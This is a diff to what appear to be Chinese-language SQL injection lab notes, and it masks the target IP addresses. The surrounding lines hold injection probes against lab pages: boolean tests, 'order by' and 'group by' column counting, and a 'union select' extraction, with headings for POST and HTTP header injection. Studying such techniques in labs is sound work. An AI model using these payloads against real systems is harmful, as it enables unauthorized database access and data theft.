@@ -152,11 +152,11 @@ mysql注释方法
 1. 判断是否存在注入漏洞，识别注入点类型
 
     ```sql
-    http://1.14.28.17:46649/string.php?id=1and1=1%23
-    http://1.14.28.17:46649/string.php?id=1and1=2%23
+    http://1.14.28.x:46649/string.php?id=1and1=1%23
+    http://1.14.28.x:46649/string.php?id=1and1=2%23
     //非数字型
-    http://1.14.28.17:46649/string.php?id=1'and1=1%23
-    http://1.14.28.17:46649/string.php?id=1'and1=2%23
+    http://1.14.28.x:46649/string.php?id=1'and1=1%23
+    http://1.14.28.x:46649/string.php?id=1'and1=2%23
     //字符型
     ```
 2. 获取数据信息
@@ -164,9 +164,9 @@ mysql注释方法
     1. 判断注入点字段数
 
         ```sql
-        http://1.14.28.17:46649/string.php?id=1' order by 1%23
-        http://1.14.28.17:46649/string.php?id=1' order by 4%23
-        http://1.14.28.17:58551/string.php?id=1' group by 3%23
+        http://1.14.28.x:46649/string.php?id=1' order by 1%23
+        http://1.14.28.x:46649/string.php?id=1' order by 4%23
+        http://1.14.28.x:58551/string.php?id=1' group by 3%23
         ```
     2. 判断注入点回显位置
 
@@ -905,7 +905,7 @@ http://113.45.183.x:45962/get.php?id=0'union select 1,2,group_concat(column_name
 
 ![image-20240902182752-wg0ti0r](assets/image-20240902182752-wg0ti0r.png)
 
-# [Post Inject](http://113.45.183.4:38544/post.php)
+# [Post Inject](http://113.45.183.x:38544/post.php)
 
 ’order by 3 #    字段数2
 
@@ -919,7 +919,7 @@ http://113.45.183.x:45962/get.php?id=0'union select 1,2,group_concat(column_name
 
 ![image-20240902194018-7bvddj7](assets/image-20240902194018-7bvddj7.png)
 
-# [Http Header Inject](http://113.45.183.4:38544/ua.php)
+# [Http Header Inject](http://113.45.183.x:38544/ua.php)
 
 ![image-20240902195638-c707tis](assets/image-20240902195638-c707tis.png)
 
